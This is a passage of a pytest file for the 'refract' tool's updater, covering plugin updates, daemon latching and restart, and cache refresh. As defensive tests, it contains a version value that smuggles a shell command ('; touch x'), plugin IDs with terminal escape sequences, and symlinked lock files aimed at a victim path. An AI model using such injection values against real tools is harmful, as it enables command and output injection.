    outcomes = apply_now()
    assert statuses(outcomes) == [("server", "manual"), ("claude", "updated")]
    assert host_calls(env) == ["claude plugin marketplace update refract", "claude plugin update refract@refract"]


def test_untrusted_claude_marketplace_is_never_acted_on(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, None)
    claude_apply_stub(env, [{"name": "refract", "source": "github", "repo": "someone/else"}])
    outcomes = apply_now()
    assert [(o.name, o.status, o.detail) for o in outcomes][1] == ("claude", "skipped", "untrusted source")
    assert host_calls(env) == []


def github_server(env: Env, monkeypatch: pytest.MonkeyPatch, tmp_path: Path, uv_tool: bool) -> None:
    tool_dir = tmp_path / "uvtools"
    (tool_dir / "refract").mkdir(parents=True)
    env.stub("uv", f"{tool_dir}\n")
    monkeypatch.setattr(sys, "prefix", str(tool_dir / "refract" if uv_tool else tmp_path / "other"))
    use_dist(monkeypatch, {"url": "https://github.com/sitien173/refract", "vcs_info": {"vcs": "git"}})
    release(monkeypatch, {"tag_name": "v2.6.0"})


def test_server_uv_tool_github_reinstalls_at_the_validated_tag(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    github_server(env, monkeypatch, tmp_path, uv_tool=True)
    outcomes = apply_now()
    assert statuses(outcomes) == [("server", "updated")]
    assert host_calls(env) == [
        "uv tool install --force refract @ git+https://github.com/sitien173/refract@v2.6.0#subdirectory=server"
    ]


def test_server_github_outside_uv_tool_is_manual(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    github_server(env, monkeypatch, tmp_path, uv_tool=False)
    [outcome] = apply_now()
    assert outcome.status == "manual"
    assert "@v2.6.0#subdirectory=server" in outcome.detail
    assert outcome.detail.startswith("uv pip install -p ")
    assert host_calls(env) == []


def test_unvalidated_version_never_reaches_a_command(env: Env) -> None:
    env.stub("uv", "")
    installs = [Install("server", "github", None, "", uv_tool=True, version="2.5.0")]
    result = updater.CheckResult((updater.Component("server", "github", "update", "x"),), "2.6.0; touch x", None)
    [outcome] = updater._apply_updates(installs, result)
    assert outcome.status == "failed"
    assert host_calls(env) == []


def test_unknown_server_install_is_manual_with_a_command(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, None)
    [outcome] = apply_now()
    assert outcome.status == "manual"
    assert outcome.detail.startswith("uv pip install -p ")


def test_pi_git_source_runs_pi_update(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, None)
    release(monkeypatch, {"tag_name": "v2.6.0"})
    pi_settings(env, ["https://github.com/sitien173/refract"])
    env.stub("pi", "")
    outcomes = apply_now()
    assert statuses(outcomes) == [("server", "manual"), ("pi", "updated")]
    assert host_calls(env) == ["pi update --extension https://github.com/sitien173/refract"]


def test_pi_update_failure_is_reported(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, None)
    release(monkeypatch, {"tag_name": "v2.6.0"})
    pi_settings(env, ["https://github.com/sitien173/refract"])
    env.stub("pi", "", 2)
    assert apply_now()[1].detail == "pi update failed (exit 2)"


def test_pi_local_path_needs_only_the_clone_pull(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    make_package(repos.clone / "plugin")
    (repos.clone / ".git" / "info" / "exclude").write_text("plugin/\n")
    use_dist(monkeypatch, None)
    pi_settings(env, [str(repos.clone / "plugin")])
    env.stub("pi", "")
    sha = repos.upstream_commit("b")
    assert statuses(apply_now()) == [("server", "manual"), ("pi", "updated")]
    assert git(repos.clone, "rev-parse", "HEAD") == sha
    assert host_calls(env) == []


def test_codex_and_agy_are_manual_with_exact_commands(env: Env, shared: str) -> None:
    env.stub("codex", json.dumps([{"id": "refract@refract-mp", "name": "refract"}]))
    env.stub("agy", json.dumps([{"name": "refract"}]))
    outcomes = {o.name: o for o in apply_now()}
    assert outcomes["codex"].status == "manual"
    assert outcomes["codex"].detail == "codex plugin marketplace upgrade && codex plugin add refract@refract-mp"
    assert (outcomes["agy"].status, outcomes["agy"].detail) == (
        "manual", "agy plugin install https://github.com/sitien173/refract"
    )
    assert not any(c.startswith(("codex plugin add", "codex plugin marketplace", "agy plugin install")) for c in env.call_log())


def test_codex_without_a_marketplace_id_uses_a_placeholder(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, None)
    env.stub("codex", json.dumps([{"name": "refract"}]))
    outcome = next(o for o in apply_now() if o.name == "codex")
    assert outcome.detail == "codex plugin marketplace upgrade && codex plugin add refract@<marketplace>"


def test_non_update_states_pass_through_without_commands(env: Env) -> None:
    env.stub("uv", "")
    installs = [
        Install("server", "clone", None, "", path=Path("/nowhere")),
        Install("pi", "clone", None, ""),
        Install("pi", "unknown", "skipped", "untrusted source"),
        Install("claude", "unknown", "failed", "cannot list plugins: exit 1"),
    ]
    comps = (
        updater.Component("server", "clone", "current", "up to date"),
        updater.Component("pi", "clone", "skipped", "dirty"),
        updater.Component("pi", "unknown", "skipped", "untrusted source"),
        updater.Component("claude", "unknown", "failed", "cannot list plugins: exit 1"),
    )
    outcomes = updater._apply_updates(installs, updater.CheckResult(comps, None, None))
    assert [(o.status, o.detail) for o in outcomes] == [
        ("current", "up to date"), ("skipped", "dirty"), ("skipped", "untrusted source"), ("failed", "cannot list plugins: exit 1"),
    ]
    assert env.call_log() == []


def test_unexpected_error_in_one_step_is_isolated(env: Env, shared: str, monkeypatch: pytest.MonkeyPatch) -> None:
    def boom(*_a: Any, **_k: Any):
        raise RuntimeError("secret detail")

    monkeypatch.setattr(updater, "_apply_server", boom)
    outcomes = apply_now()
    assert [(o.name, o.status) for o in outcomes] == [("server", "failed"), ("claude", "updated"), ("pi", "updated")]
    assert "secret detail" not in outcomes[0].detail


def test_apply_subprocesses_use_argument_lists_timeouts_and_closed_stdin(env: Env, shared: str, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[tuple[Any, dict[str, Any]]] = []
    real = subprocess.run

    def spy(args: Any, **kwargs: Any):
        calls.append((args, kwargs))
        return real(args, **kwargs)

    monkeypatch.setattr(updater.subprocess, "run", spy)
    popens = spy_popen(monkeypatch)
    apply_now()
    check_popens(popens)
    assert any(a[:2] == ["git", "-C"] and "pull" in a for a, _ in calls)
    assert any(c.startswith("uv ") for c in env.call_log())
    for args, kwargs in calls:
        assert isinstance(args, list)
        assert all(isinstance(a, str) for a in args)
        assert kwargs.get("timeout")
        assert not kwargs.get("shell")
        assert kwargs.get("stdin") is subprocess.DEVNULL


def test_updater_has_no_function_level_imports() -> None:
    import ast

    tree = ast.parse(Path(updater.__file__).read_text())
    nested = [
        node.lineno
        for fn in ast.walk(tree)
        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef))
        for node in ast.walk(fn)
        if isinstance(node, (ast.Import, ast.ImportFrom))
    ]
    assert nested == []


# --- phase 3 task 4: restart and report ---------------------------------

REMINDER = "Restart open Claude Code, Pi, Codex, and agy sessions to load the update."


def closed_port_config(env: Env) -> None:
    env.refract_home.mkdir(exist_ok=True)
    (env.refract_home / "config.toml").write_text(f"[daemon]\nport = {free_port()}\n")


@pytest.fixture
def restart(monkeypatch: pytest.MonkeyPatch) -> dict[str, Any]:
    """Stub the restart spawn and the status probe; `answers` controls the probe."""
    state: dict[str, Any] = {"spawned": 0, "answers": True, "order": []}

    def spawn() -> None:
        state["spawned"] += 1
        state["order"].append("spawn")

    monkeypatch.setattr(updater, "_spawn_serve", spawn)
    monkeypatch.setattr(updater, "_daemon_answers", lambda _h, _p: state["answers"])
    monkeypatch.setattr(updater, "POLL_S", 0.01)
    monkeypatch.setattr(updater, "RESTART_WAIT_S", 0.2)
    return state


def idle_daemon(env: Env, make_daemon: Any) -> StubDaemon:
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0}, stops=True)
    daemon.write_daemon_file()
    return daemon


def test_idle_latch_then_apply_then_restart(env: Env, pending: str, make_daemon: Any, restart: dict[str, Any], monkeypatch: pytest.MonkeyPatch) -> None:
    idle_daemon(env, make_daemon)
    monkeypatch.setattr(
        updater, "_apply_updates", lambda i, r: restart["order"].append("apply") or [updater.Outcome("server", "clone", "updated")]
    )
    lines: list[str] = []
    assert run_update(lines) == 0
    assert restart["order"] == ["apply", "spawn"]
    assert lines == ["server (clone): updated", "daemon: restarted", REMINDER]


def test_no_restart_when_this_run_did_not_stop_the_daemon(env: Env, pending: str, make_daemon: Any, restart: dict[str, Any]) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()
    assert run_update() == 0
    assert restart["spawned"] == 0


def test_restart_probe_polls_until_the_daemon_answers(env: Env, pending: str, make_daemon: Any, restart: dict[str, Any], monkeypatch: pytest.MonkeyPatch) -> None:
    idle_daemon(env, make_daemon)
    answers = iter([False, False, True])
    monkeypatch.setattr(updater, "_daemon_answers", lambda _h, _p: next(answers))
    lines: list[str] = []
    assert run_update(lines) == 0
    assert "daemon: restarted" in lines


def test_restart_failure_is_nonzero_and_names_the_command(env: Env, pending: str, make_daemon: Any, restart: dict[str, Any]) -> None:
    idle_daemon(env, make_daemon)
    restart["answers"] = False
    lines: list[str] = []
    assert run_update(lines) == 1
    assert any(line.startswith("daemon: failed") and "refract serve" in line for line in lines)
    assert lines[-1] == REMINDER


def test_spawn_error_is_a_restart_failure(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    idle_daemon(env, make_daemon)

    def boom() -> None:
        raise OSError("no refract")

    monkeypatch.setattr(updater, "_spawn_serve", boom)
    lines: list[str] = []
    assert run_update(lines) == 1
    assert any(line.startswith("daemon: failed") and "refract serve" in line for line in lines)


def test_spawn_serve_is_detached_with_an_argument_list(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[tuple[Any, dict[str, Any]]] = []
    monkeypatch.setattr(updater.subprocess, "Popen", lambda args, **kwargs: seen.append((args, kwargs)))
    updater._spawn_serve()
    [(args, kwargs)] = seen
    assert isinstance(args, list)
    assert args[1:] == ["serve"]
    assert Path(args[0]).stem.lower() == "refract"
    assert kwargs["stdin"] is kwargs["stdout"] is kwargs["stderr"] is subprocess.DEVNULL
    assert kwargs["start_new_session"] is True
    assert not kwargs.get("shell")


def test_report_has_one_line_per_component_in_the_fixed_vocabulary(env: Env, pending: str, make_daemon: Any, restart: dict[str, Any], monkeypatch: pytest.MonkeyPatch) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()
    outcomes = [
        updater.Outcome("server", "clone", "updated"),
        updater.Outcome("claude", "clone", "current", "up to date"),
        updater.Outcome("pi", "clone", "skipped", "dirty"),
        updater.Outcome("codex", "unknown", "manual", "codex plugin marketplace upgrade && codex plugin add refract@<marketplace>"),
        updater.Outcome("agy", "unknown", "failed", "boom"),
    ]
    monkeypatch.setattr(updater, "_apply_updates", lambda i, r: outcomes)
    lines: list[str] = []
    assert run_update(lines) == 1
    assert lines == [
        "server (clone): updated",
        "claude (clone): current up to date",
        "pi (clone): skipped dirty",
        "codex (unknown): manual codex plugin marketplace upgrade && codex plugin add refract@<marketplace>",
        "agy (unknown): failed boom",
        REMINDER,
    ]


def test_partial_failure_never_claims_blanket_success(env: Env, shared: str, make_daemon: Any, restart: dict[str, Any]) -> None:
    env.stub("uv", "", 1)
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert lines == [
        "server (clone): failed install failed (exit 1)",
        "claude (clone): updated",
        "pi (clone): updated",
        REMINDER,
    ]
    assert not any("success" in line.lower() or line.lower().startswith("all") for line in lines)


def test_full_run_exits_zero_and_rewrites_the_cache(env: Env, repos: Repos, shared: str, make_daemon: Any, restart: dict[str, Any]) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()
    env.refract_home.mkdir(exist_ok=True)
    cache_file(env).write_text(json.dumps({"schema": 1, "checked_at": 1.0, "update_available": True, "components": []}))
    lines: list[str] = []
    assert run_update(lines) == 0
    assert lines[-1] == REMINDER
    data = read(env)
    assert data["checked_at"] > 1.0
    assert data["update_available"] is False
    assert [(c["name"], c["state"]) for c in data["components"]] == [("server", "current"), ("claude", "current"), ("pi", "current")]


def test_nothing_to_update_prints_components_and_refreshes_cache(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch, make_daemon: Any, restart: dict[str, Any]) -> None:
    clone_server(monkeypatch, repos)
    lines: list[str] = []
    assert run_update(lines) == 0
    assert lines == ["server (clone): current up to date"]
    assert read(env)["update_available"] is False
    assert restart["spawned"] == 0


def test_cache_write_failure_does_not_fail_the_run(env: Env, shared: str, make_daemon: Any, restart: dict[str, Any], monkeypatch: pytest.MonkeyPatch) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()

    def boom(*_a: Any, **_k: Any):
        raise OSError("disk full")

    monkeypatch.setattr(updater, "write_cache", boom)
    lines: list[str] = []
    assert run_update(lines) == 0
    assert any("update-check.json" in line for line in lines)


# --- phase 3 fix batch 1 ------------------------------------------------


def test_latch_post_ignores_proxy_environment(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch, applied: list[bool]) -> None:
    for key in ("NO_PROXY", "no_proxy"):
        monkeypatch.delenv(key, raising=False)
    for key in ("HTTP_PROXY", "http_proxy"):
        monkeypatch.setenv(key, f"http://127.0.0.1:{free_port()}")
    daemon = make_daemon(body={"stopping": False, "running": 1, "queued": 0})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert "Refused: 1 running, 0 queued job(s). Nothing was changed." in lines
    assert daemon.requests == [("/dashboard/api/shutdown", f"Bearer {TOKEN}")]


def test_status_probe_ignores_proxy_environment(env: Env, make_daemon: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    for key in ("NO_PROXY", "no_proxy"):
        monkeypatch.delenv(key, raising=False)
    for key in ("HTTP_PROXY", "http_proxy"):
        monkeypatch.setenv(key, f"http://127.0.0.1:{free_port()}")
    daemon = make_daemon()
    assert updater._daemon_answers("127.0.0.1", daemon.port) is True


def test_project_scoped_unchanged_sha_is_failed_with_manual_command(env: Env, repos: Repos, shared: str) -> None:
    PLUGIN_PROJECT = [{**PLUGIN[0], "scope": "project"}]
    claude_apply_stub(env, [{"name": "refract", "source": "directory", "path": str(repos.clone)}])
    (env.root / "before.json").write_text(json.dumps(PLUGIN_PROJECT))
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "project", "gitCommitSha": "a" * 40}]})
    outcome = apply_now()[1]
    assert outcome.status == "failed"
    assert "claude plugin uninstall refract@refract -s project --keep-data" in outcome.detail
    assert "claude plugin install refract@refract -s project" in outcome.detail
    assert not any(c.startswith(("claude plugin uninstall", "claude plugin install")) for c in env.call_log())


def test_symlinked_update_lock_is_not_followed(env: Env, pending: str, tmp_path: Path, applied: list[bool]) -> None:
    env.refract_home.mkdir()
    target = tmp_path / "victim"
    (env.refract_home / "update.lock").symlink_to(target)
    lines: list[str] = []
    assert run_update(lines) == 1
    assert len(lines) == 1
    assert lines[0].startswith("Failed:")
    assert "update.lock" in lines[0]
    assert not target.exists()
    assert applied == []


def test_symlinked_check_lock_exits_quietly(env: Env, repos: Repos, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    env.refract_home.mkdir()
    target = tmp_path / "victim"
    (env.refract_home / "update-check.lock").symlink_to(target)
    lines: list[str] = []
    assert updater.run_check(out=lines.append) == 0
    assert lines == []
    assert not target.exists()
    assert not cache_file(env).exists()


def test_latch_wait_timeout_hints_the_daemon_may_be_stopping(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch, applied: list[bool]) -> None:
    monkeypatch.setattr(updater, "LATCH_WAIT_S", 0.2)
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert any("The daemon may be stopping; run: refract serve" in line for line in lines)


def test_post_timeout_hints_the_daemon_may_be_stopping(env: Env, pending: str, make_daemon: Any, monkeypatch: pytest.MonkeyPatch, applied: list[bool]) -> None:
    daemon = make_daemon()
    daemon.write_daemon_file()

    class Slow:
        def open(self, *_a: Any, **_k: Any):
            raise TimeoutError("timed out")

    monkeypatch.setattr(urllib.request, "build_opener", lambda *_h: Slow())
    lines: list[str] = []
    assert run_update(lines) == 1
    assert any("The daemon may be stopping; run: refract serve" in line for line in lines)
    assert applied == []


def test_claude_uses_the_verified_marketplace_name(env: Env, repos: Repos, shared: str) -> None:
    (env.root / "before.json").write_text(json.dumps([{**PLUGIN[0], "marketplace": "mp2"}]))
    claude_apply_stub(env, [{"name": "mp2", "source": "directory", "path": str(repos.clone)}])
    (env.root / "before.json").write_text(json.dumps([{**PLUGIN[0], "marketplace": "mp2"}]))
    outcome = apply_now()[1]
    assert outcome.status == "updated"
    assert "claude plugin marketplace update mp2" in env.call_log()
    assert "claude plugin marketplace update refract" not in env.call_log()


def test_restart_probes_the_configured_endpoint(env: Env, make_daemon: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    daemon = make_daemon()
    daemon.write_config()
    monkeypatch.setattr(updater, "_spawn_serve", lambda: None)
    monkeypatch.setattr(updater, "POLL_S", 0.01)
    monkeypatch.setattr(updater, "RESTART_WAIT_S", 0.2)
    assert updater._restart() is True


# --- fix batch 2: stale Claude Code cache over a current clone ----------

def git_logging(env: Env) -> None:
    """Put a git wrapper first on PATH that logs argv to the call log, then runs the real git."""
    env.stub("git", body=f"sys.exit(__import__('subprocess').call([{env.real_git!r}, *args]))")


def git_pulls(env: Env) -> list[str]:
    return [c for c in env.call_log() if c.startswith("git ") and " pull " in f"{c} "]


def stale_cache(env: Env, repos: Repos, installed: str | None = "a" * 40, **stub: Any) -> None:
    record: dict[str, Any] = {"scope": "user"}
    if installed is not None:
        record["gitCommitSha"] = installed
    seed_installed(env.claude_dir, {"refract@refract": [record]})
    claude_apply_stub(env, [{"name": "refract", "source": "directory", "path": str(repos.clone)}], **stub)
    env.stub("uv", "")


def claude_component() -> updater.Component:
    return next(c for c in updater.classify(updater.discover()).components if c.name == "claude")


def test_classify_claude_stale_cache_over_current_clone_is_update(env: Env, repos: Repos) -> None:
    stale_cache(env, repos)
    head = git(repos.clone, "rev-parse", "HEAD")
    component = claude_component()
    assert (component.state, component.detail) == ("update", f"plugin cache {'a' * 12} differs from clone {head[:12]}")


def test_classify_claude_stale_cache_over_clone_ahead_of_upstream_is_update(env: Env, repos: Repos) -> None:
    head = commit(repos.clone, "local")
    stale_cache(env, repos, installed=git(repos.clone, "rev-parse", "HEAD~1"))
    component = claude_component()
    assert component.state == "update"
    assert component.detail.endswith(f"differs from clone {head[:12]}")


def test_classify_claude_equal_installed_sha_is_current(env: Env, repos: Repos) -> None:
    stale_cache(env, repos, installed=git(repos.clone, "rev-parse", "HEAD"))
    assert (claude_component().state, claude_component().detail) == ("current", "up to date")


def test_classify_claude_abbreviated_installed_sha_matching_head_is_current(env: Env, repos: Repos) -> None:
    stale_cache(env, repos, installed=git(repos.clone, "rev-parse", "--short=12", "HEAD"))
    assert claude_component().state == "current"


def test_classify_claude_missing_installed_sha_is_current(env: Env, repos: Repos) -> None:
    stale_cache(env, repos, installed=None)
    assert claude_component().state == "current"


def test_classify_claude_invalid_installed_sha_is_current(env: Env, repos: Repos) -> None:
    stale_cache(env, repos, installed="not-a-sha")
    assert claude_component().state == "current"


def test_classify_claude_unreadable_head_keeps_clone_state(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    stale_cache(env, repos)
    real = updater._git

    def no_head(root: Path, *args: str, **kwargs: Any):
        return None if args[:2] == ("rev-parse", "HEAD") else real(root, *args, **kwargs)

    monkeypatch.setattr(updater, "_git", no_head)
    assert claude_component().state == "current"


def test_classify_claude_diverged_clone_stays_skipped(env: Env, repos: Repos) -> None:
    repos.upstream_commit("b")
    commit(repos.clone, "local")
    stale_cache(env, repos)
    component = claude_component()
    assert (component.state, component.detail) == ("skipped", "diverged")


def test_classify_claude_dirty_clone_stays_skipped(env: Env, repos: Repos) -> None:
    (repos.clone / "a").write_text("changed")
    stale_cache(env, repos)
    component = claude_component()
    assert (component.state, component.detail) == ("skipped", "dirty")


def test_classify_claude_behind_clone_stays_behind_upstream(env: Env, repos: Repos) -> None:
    repos.upstream_commit("b")
    stale_cache(env, repos)
    component = claude_component()
    assert (component.state, component.detail) == ("update", "behind upstream")


def test_classify_reads_each_clone_head_once(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    stale_cache(env, repos)
    [claude] = updater.discover_claude()
    installs = [claude, dataclasses.replace(claude, ref="refract2@refract")]
    reads: list[Path] = []
    real = updater._git

    def spy(root: Path, *args: str, **kwargs: Any):
        if args[:2] == ("rev-parse", "HEAD"):
            reads.append(root)
        return real(root, *args, **kwargs)

    monkeypatch.setattr(updater, "_git", spy)
    components = updater.classify(installs).components
    assert [c.state for c in components] == ["update", "update"]
    assert reads == [repos.clone.resolve()]


def test_classify_leaves_server_and_pi_alone_when_only_the_claude_cache_is_stale(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    make_package(repos.clone / "plugin")
    (repos.clone / ".git" / "info" / "exclude").write_text("plugin/\n")
    pi_settings(env, [str(repos.clone / "plugin")])
    stale_cache(env, repos)
    states = {c.name: c.state for c in updater.classify(updater.discover()).components}
    assert states == {"server": "current", "claude": "update", "pi": "current"}


@pytest.fixture
def idle_closed_port(env: Env, make_daemon: Any, restart: dict[str, Any]) -> None:
    daemon = make_daemon()
    daemon.write_config()
    daemon.close()


def test_check_reports_update_available_for_a_stale_claude_cache(env: Env, repos: Repos) -> None:
    stale_cache(env, repos)
    with pytest.raises(SystemExit) as exit_info:
        cli.main(["update", "--check"])
    assert exit_info.value.code == 0
    data = read(env)
    assert data["update_available"] is True
    claude = next(c for c in data["components"] if c["name"] == "claude")
    assert claude["state"] == "update"


def test_update_refreshes_a_stale_cache_without_pulling_the_clone(env: Env, repos: Repos, idle_closed_port: None) -> None:
    head = git(repos.clone, "rev-parse", "HEAD")
    stale_cache(env, repos, sha_after_install=head)
    git_logging(env)
    reflog = git(repos.clone, "reflog")
    lines: list[str] = []
    assert run_update(lines) == 0
    assert "claude (clone): updated" in lines
    assert [c for c in env.call_log() if c.startswith("claude") and not c.endswith("list --json")] == [
        "claude plugin marketplace update refract",
        "claude plugin update refract@refract",
        "claude plugin uninstall refract@refract -s user --keep-data",
        "claude plugin install refract@refract -s user",
    ]
    assert git_pulls(env) == []
    assert git(repos.clone, "rev-parse", "HEAD") == head
    assert git(repos.clone, "reflog") == reflog


def test_update_pulls_a_behind_clone_once_then_refreshes_claude(env: Env, repos: Repos, idle_closed_port: None) -> None:
    upstream = repos.upstream_commit("b")
    stale_cache(env, repos, sha_after_install=upstream)
    git_logging(env)
    lines: list[str] = []
    assert run_update(lines) == 0
    assert "claude (clone): updated" in lines
    assert len(git_pulls(env)) == 1
    assert git(repos.clone, "rev-parse", "HEAD") == upstream
    claude_calls = [c for c in env.call_log() if c.startswith("claude") and not c.endswith("list --json")]
    assert claude_calls[:2] == ["claude plugin marketplace update refract", "claude plugin update refract@refract"]


def test_busy_daemon_with_a_stale_cache_refuses_and_runs_no_host_command(env: Env, repos: Repos, make_daemon: Any) -> None:
    stale_cache(env, repos)
    git_logging(env)
    daemon = make_daemon(body={"stopping": False, "running": 1, "queued": 0})
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 1
    assert "Refused: 1 running, 0 queued job(s). Nothing was changed." in lines
    assert git_pulls(env) == []
    assert [c for c in env.call_log() if c.startswith("claude") and not c.endswith("list --json")] == []


# --- fix batch 3: non-user scope cache mismatch is manual ----------------

PROJECT_PLUGIN = [{**PLUGIN[0], "scope": "project"}]
PROJECT_MANUAL = (
    "from the project directory run: claude plugin uninstall refract@refract -s project --keep-data"
    " && claude plugin install refract@refract -s project"
)


def project_stale_cache(env: Env, repos: Repos) -> None:
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "project", "gitCommitSha": "a" * 40}]})
    claude_stub(env, PROJECT_PLUGIN, [{"name": "refract", "source": "directory", "path": str(repos.clone)}])
    env.stub("uv", "")


def test_classify_non_user_scope_cache_mismatch_is_manual(env: Env, repos: Repos) -> None:
    project_stale_cache(env, repos)
    component = claude_component()
    assert (component.state, component.detail) == ("manual", PROJECT_MANUAL)
    assert component.cache_only is False


@pytest.mark.parametrize(("plugin_id", "scope"), [("refract@x\x1b[2J\ndaemon: restarted", "project"), ("refract@refract", "pro\nject")])
def test_reinstall_command_replaces_unsafe_id_and_scope(plugin_id: str, scope: str) -> None:
    command = updater._claude_reinstall_command(plugin_id, scope)
    assert "\x1b" not in command
    assert "\n" not in command
    assert "<id>" in command or "<scope>" in command


def test_check_does_not_count_a_manual_cache_mismatch_as_update_available(env: Env, repos: Repos) -> None:
    project_stale_cache(env, repos)
    with pytest.raises(SystemExit):
        cli.main(["update", "--check"])
    data = read(env)
    assert data["update_available"] is False
    assert next(c for c in data["components"] if c["name"] == "claude")["state"] == "manual"


def test_update_with_a_project_scope_cache_mismatch_neither_latches_nor_runs_commands(env: Env, repos: Repos, make_daemon: Any, restart: dict[str, Any]) -> None:
    project_stale_cache(env, repos)
    git_logging(env)
    daemon = make_daemon(body={"stopping": True, "running": 0, "queued": 0}, stops=True)
    daemon.write_daemon_file()
    lines: list[str] = []
    assert run_update(lines) == 0
    assert f"claude (clone): manual {PROJECT_MANUAL}" in lines
    assert daemon.requests == []
    assert restart["spawned"] == 0
    assert git_pulls(env) == []
    assert [c for c in env.call_log() if c.startswith("claude") and not c.endswith("list --json")] == []


# --- complexity refactor characterization -------------------------------


def test_claude_clone_marketplace_outside_git_is_skipped(env: Env, tmp_path: Path) -> None:
    plain = tmp_path / "plain"
    plain.mkdir()
    claude_stub(env, PLUGIN, [{"name": "refract", "source": "directory", "path": str(plain)}])
    [install] = updater.discover_claude()
    assert (install.source, install.state, install.detail) == ("clone", "skipped", "not a git clone")
    assert install.path is None


def test_claude_item_without_id_or_valid_fields_drops_them(env: Env) -> None:
    claude_stub(env, [{"name": "refract", "version": "not a version", "scope": 5}], [{"name": "refract", "source": "github", "repo": "sitien173/refract"}])
    [install] = updater.discover_claude()
    assert (install.ref, install.marketplace, install.version, install.scope) == ("refract", None, None, None)
    assert (install.source, install.state, install.detail) == ("unknown", "skipped", "untrusted source")


def latch_with(
    monkeypatch: pytest.MonkeyPatch, *, raises: Exception | None = None, reply: bytes = b""
) -> tuple[tuple[bool, Any], list[str]]:
    monkeypatch.setattr(updater, "_read_daemon_file", lambda: (TOKEN, "127.0.0.1", 1))

    def fake(request: Request, timeout: float):
        if raises is not None:
            raise raises
        return FakeResponse(reply)

    monkeypatch.setattr(updater, "_open_direct", fake)
    lines: list[str] = []
    return updater._latch(lines.append), lines


def test_latch_connection_refused_proceeds_silently(monkeypatch: pytest.MonkeyPatch) -> None:
    result, lines = latch_with(monkeypatch, raises=URLError(ConnectionRefusedError()))
    assert (result, lines) == ((True, None), [])


@pytest.mark.parametrize(
    ("raises", "line"),
    [
        (URLError("boom"), "Failed: cannot reach the daemon. Nothing was changed."),
        (OSError("boom"), "Failed: cannot reach the daemon. Nothing was changed."),
        (
            URLError(TimeoutError()),
            f"Failed: the daemon did not answer in time. {updater._MAY_BE_STOPPING} No update was applied.",
        ),
    ],
    ids=["url-error", "os-error", "timeout"],
)
def test_latch_unreachable_daemon_fails_with_one_line(monkeypatch: pytest.MonkeyPatch, raises: Exception, line: str) -> None:
    result, lines = latch_with(monkeypatch, raises=raises)
    assert (result, lines) == ((False, None), [line])


def test_latch_non_json_reply_is_unreadable(monkeypatch: pytest.MonkeyPatch) -> None:
    result, lines = latch_with(monkeypatch, reply=b"not json")
    assert (result, lines) == ((False, None), ["Failed: the daemon sent an unreadable reply. Nothing was changed."])


def test_latch_refused_reply_reports_counts(monkeypatch: pytest.MonkeyPatch) -> None:
    result, lines = latch_with(monkeypatch, reply=b'{"stopping": false, "running": 2, "queued": 3}')
    assert (result, lines) == ((False, None), ["Refused: 2 running, 3 queued job(s). Nothing was changed."])


def claude_unit(
    monkeypatch: pytest.MonkeyPatch,
    *,
    enabled: list[bool | None] | None = None,
    failing: dict[str, str] | None = None,
    head: str | None = "h" * 40,
    records: list[str | None] | None = None,
) -> list[list[str]]:
    """Stub the helpers `_apply_claude` calls; the returned list records each `_step` argv."""
    steps: list[list[str]] = []
    states = iter(enabled if enabled is not None else [True, True])
    shas = iter(records if records is not None else [])
    monkeypatch.setattr(updater, "_claude_enabled", lambda *_a: next(states))
    monkeypatch.setattr(updater, "_installed_records", dict)
    monkeypatch.setattr(updater, "_record_sha", lambda *_a: next(shas))

    def step(args: list[str], timeout: float = 0) -> str | None:
        steps.append(args)
        return (failing or {}).get(args[2])

    monkeypatch.setattr(updater, "_step", step)
    monkeypatch.setattr(
        updater, "_git", lambda *_a, **_k: None if head is None else subprocess.CompletedProcess([], 0, stdout=f"{head}\n")
    )
    return steps


def claude_install(**fields: Any) -> Install:
    base: dict[str, Any] = {"source": "github", "ref": "refract@refract", "scope": "user", "marketplace": "refract"}
    fields = {**base, **fields}
    return Install("claude", fields.pop("source"), None, "", **fields)


@pytest.mark.parametrize(
    ("fields", "detail"),
    [
        ({"ref": None}, "invalid plugin id"),
        ({"ref": "bad id"}, "invalid plugin id"),
        ({"marketplace": None}, "invalid marketplace name"),
        ({"marketplace": "bad name"}, "invalid marketplace name"),
    ],
    ids=["no-id", "bad-id", "no-marketplace", "bad-marketplace"],
)
def test_apply_claude_rejects_invalid_identifiers_without_commands(monkeypatch: pytest.MonkeyPatch, fields: dict[str, Any], detail: str) -> None:
    steps = claude_unit(monkeypatch)
